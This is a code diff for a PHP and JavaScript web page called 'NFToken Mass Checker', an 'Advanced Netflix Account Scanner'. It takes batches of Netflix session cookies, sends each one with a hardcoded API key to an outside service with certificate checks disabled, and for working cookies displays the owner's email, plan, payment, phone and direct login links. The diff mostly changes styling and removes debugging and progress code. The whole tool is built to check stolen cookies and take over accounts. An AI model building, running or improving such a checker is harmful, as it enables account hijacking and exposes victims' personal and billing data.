@@ -1,9 +1,9 @@
 <?php
 // ================= SERVER COOKIES FOLDER =================
-$cookies_folder = '/tmp/cookies';
+$cookies_folder = __DIR__ . '/cookies';
 
 if (!is_dir($cookies_folder)) {
-    @mkdir($cookies_folder, 0777, true); // 
+    mkdir($cookies_folder, 0777, true);
 }
 
 $cookie_files = glob($cookies_folder . '/*.txt');
@@ -18,48 +18,29 @@ foreach ($cookie_files as $file) {
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $raw_post_data = file_get_contents('php://input');
     $json_data = json_decode($raw_post_data, true);
-
     if (isset($json_data['cookie'])) {
         $my_api_key = "NFK_cde619bfa57bd794d0e574da";
         $api_url = "https://nftoken.site/v1/api.php";
-
         $payload = json_encode([
             'key' => $my_api_key,
             'cookie' => $json_data['cookie']
         ]);
-
         $ch = curl_init($api_url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_POST, true);
         curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
         curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);   // Important sa Vercel
-        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);   // Dagdag
-        curl_setopt($ch, CURLOPT_TIMEOUT, 30);                 // Dagdag timeout
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
         $response = curl_exec($ch);
         $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        $curl_error = curl_error($ch);
         curl_close($ch);
-
-        // Debugging
         if ($response === false) {
             http_response_code(500);
             header('Content-Type: application/json');
-            echo json_encode([
-                'status' => 'ERROR', 
-                'message' => 'Curl failed: ' . $curl_error
-            ]);
+            echo json_encode(['status' => 'ERROR', 'message' => 'Connection failed']);
             exit;
         }
-
-        // Kung walang content pero 200 OK
-        if ($http_code == 200 && empty($response)) {
-            echo json_encode(['status' => 'ERROR', 'message' => 'Empty response from API']);
-            exit;
-        }
-
         header('Content-Type: application/json');
         echo $response;
         exit;
@@ -75,33 +56,52 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <style>
-        body { background: linear-gradient(135deg, #0a0a0a, #1f2937); color: #e5e7eb; }
-        .glass { background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(16px); border: 1px solid rgba(148, 163, 184, 0.2); }
-        .result-card { transition: all 0.3s ease; }
-        .result-card:hover { transform: translateY(-4px); }
-        .modal { animation: modalPop 0.3s ease; }
+        body { 
+            background: linear-gradient(135deg, #0a0a0a, #1a2333); 
+            color: #e0f2fe; 
+            font-family: 'Segoe UI', system-ui, sans-serif;
+        }
+        .glass { 
+            background: rgba(15, 23, 42, 0.9); 
+            backdrop-filter: blur(20px); 
+            border: 1px solid rgba(59, 130, 246, 0.3); 
+            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.1);
+        }
+        .neon-text { 
+            text-shadow: 0 0 10px #3b82f6, 0 0 20px #3b82f6; 
+        }
+        .result-card { 
+            transition: all 0.3s ease; 
+            border: 1px solid rgba(59, 130, 246, 0.2);
+        }
+        .result-card:hover { 
+            transform: translateY(-6px); 
+            box-shadow: 0 20px 40px rgba(59, 130, 246, 0.2);
+        }
+        .modal { animation: modalPop 0.4s cubic-bezier(0.34, 1.56, 0.64, 1); }
         @keyframes modalPop {
-            from { opacity: 0; transform: scale(0.8); }
-            to { opacity: 1; transform: scale(1); }
+            from { opacity: 0; transform: scale(0.7) translateY(20px); }
+            to { opacity: 1; transform: scale(1) translateY(0); }
         }
     </style>
 </head>
 <body class="py-8">
 <div class="max-w-4xl mx-auto px-4">
-    <div class="text-center mb-10">
-        <h1 class="text-4xl font-bold text-white flex items-center justify-center gap-3">
-            <i class="fas fa-satellite-dish text-blue-500"></i> NFToken Mass Checker
+    <div class="text-center mb-12">
+        <h1 class="text-5xl font-bold neon-text flex items-center justify-center gap-4">
+            <i class="fas fa-satellite-dish text-blue-400"></i> NFToken Mass Checker
         </h1>
+        <p class="text-blue-300 mt-2 text-lg">Advanced Netflix Account Scanner</p>
     </div>
 
     <div class="glass rounded-3xl p-8 mb-8">
         <h2 class="text-xl font-semibold mb-4">✍️ Or Paste Manually</h2>
-        <textarea id="bulkInput" rows="8" class="w-full rounded-2xl p-6 bg-[#0f172a] border border-slate-600 focus:border-blue-500 text-gray-200" placeholder="Paste cookies here..."></textarea>
+        <textarea id="bulkInput" rows="8" class="w-full rounded-2xl p-6 bg-[#0f172a] border border-blue-500/30 focus:border-blue-400 text-gray-200 focus:ring-2 focus:ring-blue-500/50" placeholder="Paste cookies here..."></textarea>
         <div class="flex gap-3 mt-8">
-            <button onclick="startApiTest()" id="startBtn" class="flex-1 bg-gradient-to-r from-emerald-500 to-teal-600 py-5 rounded-2xl font-bold text-xl">
+            <button onclick="startApiTest()" id="startBtn" class="flex-1 bg-gradient-to-r from-emerald-500 to-cyan-500 py-5 rounded-2xl font-bold text-xl shadow-xl hover:scale-105 transition-all">
                 🚀 START MASS CHECK
             </button>
-            <button onclick="generateRandomLiveAccount()" class="flex-1 bg-gradient-to-r from-purple-500 to-violet-600 py-5 rounded-2xl font-bold text-xl">
+            <button onclick="generateRandomLiveAccount()" class="flex-1 bg-gradient-to-r from-purple-500 to-violet-600 py-5 rounded-2xl font-bold text-xl shadow-xl hover:scale-105 transition-all">
                 🎲 Generate 1 Random Live Account
             </button>
         </div>
@@ -131,12 +131,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     <span id="deadCount" class="block text-3xl font-bold text-red-400">0</span>
                 </div>
             </div>
-            <span id="progressText" class="text-gray-400 font-medium">0%</span>
-        </div>
-
-        <!-- Improved Progress Bar -->
-        <div class="h-3 bg-gray-700 rounded-full mb-6 overflow-hidden">
-            <div id="progressBar" class="h-full bg-gradient-to-r from-blue-400 to-cyan-400 w-0 transition-all duration-300"></div>
+            <span id="progressText" class="text-gray-400 font-medium">Processing 0 of 0</span>
         </div>
 
         <div class="flex gap-2 mb-6">
@@ -167,7 +162,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <script>
     let allCookiesFromFolder = [];
     let isPaused = false;
-    let startTime = 0;
 
     document.getElementById('folderInput').addEventListener('change', async function(e) {
         const files = Array.from(e.target.files).filter(f => f.name.endsWith('.txt'));
@@ -250,90 +244,51 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             showModal("No Cookies Found", "Please do one of the following:\n\n• Paste cookies in the box above\n• Click SELECT FOLDER and choose your .txt files");
             return;
         }
-
-        startTime = Date.now();
-        $('#startBtn').hide();
-        $('#pauseBtn').show();
         $('#resultsCard').show();
         $('#resultsList').empty();
-
         let total = cookies.length;
         let alive = 0;
-        let dead = 0;
-
         $('#totalCount').text(total);
         $('#aliveCount').text(0);
-        $('#deadCount').text(0);
-
         const apiUrl = window.location.href;
-
         for (let i = 0; i < cookies.length; i++) {
-            if (isPaused) while (isPaused) await sleep(500);
-
-            const elapsed = (Date.now() - startTime) / 1000;
-            const progress = Math.round(((i + 1) / total) * 100);
-            const speed = i / elapsed;
-            const remaining = speed > 0 ? Math.round((total - i - 1) / speed) : 0;
-
-            $('#progressText').text(`${progress}% • ETA: ${remaining}s`);
-            document.getElementById('progressBar').style.width = progress + '%';
-
+            $('#progressText').text(`Processing ${i + 1} of ${total}...`);
             try {
-    const text = await response.text();
-    console.log("Raw API Response:", text);   // ← Mahalaga ito para makita ang problema
-
-    let data;
-    try {
-        data = JSON.parse(text);
-    } catch(e) {
-        console.error("JSON Parse Error:", e);
-        throw new Error("Invalid JSON from server");
-    }
-
-    console.log("Parsed Data:", data);   // ← Dagdag para debugging
-
-    if (data.status === 'SUCCESS') {
-        alive++;
-        $('#aliveCount').text(alive);
-        
-        let resultHtml = `
-        <div class="result-card glass rounded-2xl p-6" data-type="alive">
-            <div class="flex items-center gap-3 mb-4">
-                <span class="bg-emerald-500/20 text-emerald-400 px-4 py-1 rounded-full text-sm font-medium">SUCCESS</span>
-                <span class="text-xl font-semibold">${data.x_mail || 'N/A'}</span>
-            </div>
-            <div class="grid grid-cols-2 gap-4 text-sm">
-                <div><strong>Plan:</strong> ${data.x_tier || 'Unknown'}</div>
-                <div><strong>Country:</strong> ${data.x_loc || 'N/A'}</div>
-                <div><strong>Renewal:</strong> ${data.x_ren || 'N/A'}</div>
-                <div><strong>Since:</strong> ${data.x_mem || 'N/A'}</div>
-                <div><strong>Payment:</strong> ${data.x_bil || 'N/A'}</div>
-                <div><strong>Phone:</strong> ${data.x_tel || 'N/A'}</div>
-                <div class="col-span-2"><strong>Profiles:</strong> ${data.x_usr || 'N/A'}</div>
-            </div>
-            <div class="flex gap-3 mt-6">
-                <a href="${data.x_l1 || '#'}" target="_blank" class="flex-1 bg-zinc-800 hover:bg-zinc-700 py-3 rounded-xl text-center">🖥️ PC</a>
-                <a href="${data.x_l2 || '#'}" target="_blank" class="flex-1 bg-zinc-800 hover:bg-zinc-700 py-3 rounded-xl text-center">📱 Mobile</a>
-                <a href="${data.x_l3 || '#'}" target="_blank" class="flex-1 bg-zinc-800 hover:bg-zinc-700 py-3 rounded-xl text-center">📺 TV</a>
-            </div>
-        </div>`;
-        
-        $('#resultsList').append(resultHtml);
-    } else {
-        dead++;
-        $('#deadCount').text(dead);
-    }
-} catch (e) {
-    console.error("Fetch/Catch Error:", e);
-    dead++;
-    $('#deadCount').text(dead);
-}
-
-if (i < cookies.length - 1) await sleep(700);
-
+                const response = await fetch(apiUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ cookie: cookies[i] })
+                });
+                const data = JSON.parse(await response.text());
+                if (data.status === 'SUCCESS') {
+                    alive++;
+                    $('#aliveCount').text(alive);
+                    let resultHtml = `
+                    <div class="result-card glass rounded-2xl p-6" data-type="alive">
+                        <div class="flex items-center gap-3 mb-4">
+                            <span class="bg-emerald-500/20 text-emerald-400 px-4 py-1 rounded-full text-sm font-medium">SUCCESS</span>
+                            <span class="text-xl font-semibold">${data.x_mail || 'N/A'}</span>
+                        </div>
+                        <div class="grid grid-cols-2 gap-4 text-sm">
+                            <div><strong>Plan:</strong> ${data.x_tier || 'Unknown'}</div>
+                            <div><strong>Country:</strong> ${data.x_loc || 'N/A'}</div>
+                            <div><strong>Renewal:</strong> ${data.x_ren || 'N/A'}</div>
+                            <div><strong>Since:</strong> ${data.x_mem || 'N/A'}</div>
+                            <div><strong>Payment:</strong> ${data.x_bil || 'N/A'}</div>
+                            <div><strong>Phone:</strong> ${data.x_tel || 'N/A'}</div>
+                            <div class="col-span-2"><strong>Profiles:</strong> ${data.x_usr || 'N/A'}</div>
+                        </div>
+                        <div class="flex gap-3 mt-6">
+                            <a href="${data.x_l1 || '#'}" target="_blank" class="flex-1 bg-zinc-800 hover:bg-zinc-700 py-3 rounded-xl text-center">🖥️ PC</a>
+                            <a href="${data.x_l2 || '#'}" target="_blank" class="flex-1 bg-zinc-800 hover:bg-zinc-700 py-3 rounded-xl text-center">📱 Mobile</a>
+                            <a href="${data.x_l3 || '#'}" target="_blank" class="flex-1 bg-zinc-800 hover:bg-zinc-700 py-3 rounded-xl text-center">📺 TV</a>
+                        </div>
+                    </div>`;
+                    $('#resultsList').append(resultHtml);
+                }
+            } catch (e) {}
+        }
         $('#progressText').text(`Finished! Processed ${total} cookies.`);
-        $('#startBtn').show();
-        $('#pauseBtn').hide();
     }
 
     async function generateRandomLiveAccount() {
